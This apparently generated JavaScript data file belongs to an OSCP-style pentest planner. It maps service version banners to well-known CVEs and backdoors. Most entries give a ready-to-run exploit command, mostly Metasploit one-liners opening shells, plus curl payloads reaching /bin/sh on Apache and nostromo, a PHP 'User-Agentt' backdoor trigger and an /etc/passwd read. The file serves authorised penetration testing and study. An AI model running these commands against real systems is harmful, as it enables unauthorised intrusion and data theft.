/* GENERATED FILE — DO NOT EDIT. Built from public/ + seed.js by scripts/build-static.js. */
"use strict";
// ── Version → known-exploit map ──────────────────────────────────────────────
// Deterministic, offline, no AI. nmap hands you a service VERSION string
// ("vsftpd 2.3.4", "OpenSSH 8.2p1", "Apache httpd 2.4.49"); this table says which
// of those exact versions carry a public, well-known exploit — the single highest-
// signal thing an OSCP candidate wants to see first. The engine (scenario.js
// vulnsFor) tests each entry's `product` regex against the banner and its `ver`
// spec against the parsed version number, and the plan surfaces the hits as a
// priority callout ABOVE the recon waves (a known version exploit is move #1).
//
// CURATION RULE: high confidence only. A wrong CVE in an exam tool is worse than
// a missing one, so every entry here is a canonical, widely-documented service-
// version vuln with a real exploit path, and the version ranges were checked
// against the CVE/advisory, not guessed. When a version carries a letter (HFS
// 2.3b, ProFTPD 1.3.3c) numeric comparison cannot tell it apart from its patched
// sibling, so those use a `ver.re` that matches the vulnerable spellings only.
//
// `ver` spec, evaluated by scenario.js:
//   {eq:"2.3.4"}              exact (parsed numerically: 2.3.4 == 2.3.4a's [2,3,4])
//   {lt:"7.8"} {le} {gt} {ge} numeric bounds, combinable into a range
//   {re:/.../}               tested against the raw version string (lettered builds)
//   {any:true}              product match alone (the daemon is vulnerable by design)
// <TARGET_IP> and <PORT> in `exploit` are filled from the machine + the matched
// service's port. tun0/LHOST stay literal — they are the operator's, not the box's.
window.CS_VULN_MAP = [
  // ── FTP ──────────────────────────────────────────────────────────────────
  {
    svc: "ftp", product: /vsftpd/i, ver: { eq: "2.3.4" },
    title: "vsftpd 2.3.4 backdoor", id: "CVE-2011-2523", sev: "critical",
    exploit: `msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS <TARGET_IP>; run"`,
    note: "A login whose username ends in :) opens a root shell on 6200/tcp. Triggerable by hand: log in as x:), then nc <TARGET_IP> 6200.",
  },
  {
    svc: "ftp", product: /proftpd/i, ver: { re: /1\.3\.3c/i },
    title: "ProFTPD 1.3.3c backdoor", id: "OSVDB-69562", sev: "critical",
    exploit: `msfconsole -q -x "use exploit/unix/ftp/proftpd_133c_backdoor; set RHOSTS <TARGET_IP>; set LHOST tun0; run"`,
    note: "The 1.3.3c release tarball was trojaned at the source: the HELP ACIDBITCHEZ command opens a root shell.",
  },
  {
    svc: "ftp", product: /proftpd/i, ver: { eq: "1.3.5" },
    title: "ProFTPD 1.3.5 mod_copy file copy / RCE", id: "CVE-2015-3306", sev: "high",
    exploit: `msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS <TARGET_IP>; set SITEPATH /var/www/html; set LHOST tun0; run"`,
    note: "SITE CPFR/CPTO copies files with no auth — write a PHP shell into a known web root. Needs mod_copy (on by default) and a writable docroot path.",
  },
  // ── SSH ──────────────────────────────────────────────────────────────────
  {
    svc: "ssh", product: /openssh/i, ver: { lt: "7.8" },
    title: "OpenSSH < 7.8 username enumeration", id: "CVE-2018-15473", sev: "medium",
    exploit: `msfconsole -q -x "use scanner/ssh/ssh_enumusers; set RHOSTS <TARGET_IP>; set RPORT <PORT>; set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt; run"`,
    note: "Not RCE — a timing oracle that confirms which usernames exist. Build a user list from it, then spray. Fixed in 7.8.",
  },
  // ── SMB ──────────────────────────────────────────────────────────────────
  {
    svc: "smb", product: /samba|smbd/i, ver: { ge: "3.0.20", le: "3.0.25" },
    title: "Samba 3.0.20–3.0.25 usermap_script command execution", id: "CVE-2007-2447", sev: "critical",
    exploit: `msfconsole -q -x "use exploit/multi/samba/usermap_script; set RHOSTS <TARGET_IP>; set LHOST tun0; run"`,
    note: "The 'username map script' option passes the SMB username straight to a shell — unauthenticated RCE as root.",
  },
  // ── Mail ─────────────────────────────────────────────────────────────────
  {
    svc: "smtp", product: /exim/i, ver: { ge: "4.87", le: "4.91" },
    title: "Exim 4.87–4.91 RCE (Return of the WIZard)", id: "CVE-2019-10149", sev: "critical",
    exploit: `msfconsole -q -x "use exploit/linux/smtp/exim4_deliver_message; set RHOSTS <TARGET_IP>; set RPORT <PORT>; set LHOST tun0; run"`,
    note: "A crafted RCPT TO reaches deliver_message() and runs commands as root. Distros backport the fix — confirm the real build before relying on the banner.",
  },
  // ── IRC ──────────────────────────────────────────────────────────────────
  {
    svc: "irc", product: /unreal/i, ver: { eq: "3.2.8.1" },
    title: "UnrealIRCd 3.2.8.1 backdoor", id: "CVE-2010-2075", sev: "critical",
    exploit: `msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS <TARGET_IP>; set RPORT <PORT>; set LHOST tun0; run"`,
    note: "The shipped 3.2.8.1 archive was backdoored: a line beginning AB; runs the rest as a shell command.",
  },
  // ── Distributed build ────────────────────────────────────────────────────
  {
    svc: "distcc", product: /distcc/i, ver: { any: true },
    title: "distccd unauthenticated command execution", id: "CVE-2004-2687", sev: "high",
    exploit: `msfconsole -q -x "use exploit/unix/misc/distcc_exec; set RHOSTS <TARGET_IP>; set RPORT <PORT>; set LHOST tun0; run"`,
    note: "distccd runs any compile job it is handed with no auth — a direct command-exec foothold. Classic Metasploitable path.",
  },
  // ── Web servers ──────────────────────────────────────────────────────────
  {
    svc: "http", product: /apache/i, ver: { eq: "2.4.49" },
    title: "Apache httpd 2.4.49 path traversal + RCE", id: "CVE-2021-41773", sev: "critical",
    exploit: `curl -s --path-as-is "http://<TARGET_IP>:<PORT>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" -d "echo Content-Type: text/plain; echo; id"`,
    note: "Path traversal reads any file; RCE when mod_cgi is enabled (shown). 2.4.50 only half-fixed it — see CVE-2021-42013.",
  },
  {
    svc: "http", product: /apache/i, ver: { eq: "2.4.50" },
    title: "Apache httpd 2.4.50 path traversal + RCE", id: "CVE-2021-42013", sev: "critical",
    exploit: `curl -s --path-as-is "http://<TARGET_IP>:<PORT>/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" -d "echo Content-Type: text/plain; echo; id"`,
    note: "The incomplete fix for 41773 — the same traversal works with double-encoded dots (%%32%65).",
  },
  {
    svc: "http", product: /php/i, ver: { re: /8\.1\.0-?dev/i },
    title: "PHP 8.1.0-dev backdoor (User-Agentt)", id: "PHP 8.1.0-dev backdoor", sev: "critical",
    exploit: `curl -s http://<TARGET_IP>:<PORT>/ -H 'User-Agentt: zerodium system("id");'`,
    note: "A git compromise shipped a backdoor in the 8.1.0-dev build: a User-Agentt (two t's) header runs PHP.",
  },
  {
    svc: "http", product: /nostromo|nhttpd/i, ver: { le: "1.9.6" },
    title: "nostromo nhttpd <= 1.9.6 RCE", id: "CVE-2019-16278", sev: "critical",
    exploit: `curl -s "http://<TARGET_IP>:<PORT>/.%0d./.%0d./.%0d./.%0d./bin/sh" --data "echo; echo; id"`,
    note: "Directory traversal in http_verify reaches /bin/sh — unauthenticated RCE. Fixed in 1.9.7. Also in msf multi/http/nostromo_code_exec.",
  },
  {
    svc: "http", product: /httpfileserver|hfs|rejetto/i, ver: { re: /2\.3(?:[ab])?(?![a-z0-9])/i },
    title: "Rejetto HFS 2.3–2.3b RCE", id: "CVE-2014-6287", sev: "critical",
    exploit: `msfconsole -q -x "use exploit/windows/http/rejetto_hfs_exec; set RHOSTS <TARGET_IP>; set RPORT <PORT>; set LHOST tun0; run"`,
    note: "A %00 in a search macro runs programs (findMacroMarker). Affects 2.3 / 2.3a / 2.3b only; fixed in 2.3c.",
  },
  {
    svc: "http", product: /webmin/i, ver: { ge: "1.882", le: "1.921" },
    title: "Webmin 1.882–1.921 unauthenticated RCE", id: "CVE-2019-15107", sev: "critical",
    exploit: `msfconsole -q -x "use exploit/linux/http/webmin_backdoor; set RHOSTS <TARGET_IP>; set RPORT <PORT>; set SSL true; set LHOST tun0; run"`,
    note: "password_change.cgi injection — unauth RCE, but only when 'prompt users with expired passwords' is enabled. Fixed in 1.930.",
  },
  {
    svc: "http", product: /microsoft[ -]?iis|iis httpd/i, ver: { eq: "6.0" },
    title: "Microsoft IIS 6.0 WebDAV ScStoragePathFromUrl RCE", id: "CVE-2017-7269", sev: "high",
    exploit: `msfconsole -q -x "use exploit/windows/iis/iis_webdav_scstoragepathfromurl; set RHOSTS <TARGET_IP>; set RPORT <PORT>; set LHOST tun0; run"`,
    note: "A long 'If' header in a PROPFIND overflows the WebDAV service — Server 2003 R2, IIS 6.0 only, WebDAV enabled. IIS 7.5/10 are unaffected.",
  },
  {
    svc: "http", product: /grafana/i, ver: { re: /\b8\.(0\.[0-6]|1\.[0-7]|2\.[0-6]|3\.0)\b/ },
    title: "Grafana 8.0.0–8.3.0 plugin path traversal (arbitrary file read)", id: "CVE-2021-43798", sev: "high",
    exploit: `curl -s --path-as-is "http://<TARGET_IP>:<PORT>/public/plugins/alertlist/../../../../../../../../etc/passwd"`,
    note: "Unauthenticated file read via /public/plugins/<id>/ traversal (any installed plugin id, e.g. alertlist). Patched in 8.0.7 / 8.1.8 / 8.2.7 / 8.3.1.",
  },
  // ── Search / streaming ───────────────────────────────────────────────────
  {
    svc: "elasticsearch", product: /elasticsearch/i, ver: { lt: "1.2" },
    title: "Elasticsearch < 1.2 dynamic-script RCE", id: "CVE-2014-3120", sev: "high",
    exploit: `msfconsole -q -x "use exploit/multi/elasticsearch/script_mvel_rce; set RHOSTS <TARGET_IP>; set RPORT <PORT>; set LHOST tun0; run"`,
    note: "Dynamic scripting is on by default before 1.2, so a crafted _search MVEL payload runs Java. Usually on 9200. (The later Groovy bypass is CVE-2015-1427.)",
  },
  {
    svc: "icecast", product: /icecast/i, ver: { le: "2.0.1" },
    title: "Icecast <= 2.0.1 header overflow", id: "CVE-2004-1561", sev: "high",
    exploit: `msfconsole -q -x "use exploit/windows/http/icecast_header; set RHOSTS <TARGET_IP>; set RPORT <PORT>; set LHOST tun0; run"`,
    note: "A request carrying 32 HTTP headers overwrites a return address (Win32 build). Fixed in 2.0.2; the modern 2.3+/2.4+ line is unaffected.",
  },
  // ── TLS ──────────────────────────────────────────────────────────────────
  {
    svc: "ssl", product: /openssl/i, ver: { re: /1\.0\.1(?:[a-f])?(?![a-z0-9])/i },
    title: "OpenSSL 1.0.1–1.0.1f Heartbleed", id: "CVE-2014-0160", sev: "high",
    exploit: `nmap -p <PORT> --script ssl-heartbleed <TARGET_IP>`,
    note: "Leaks up to 64KB of server memory per request — harvest keys, cookies, creds. Info leak, not RCE. Fixed in 1.0.1g.",
  },
];
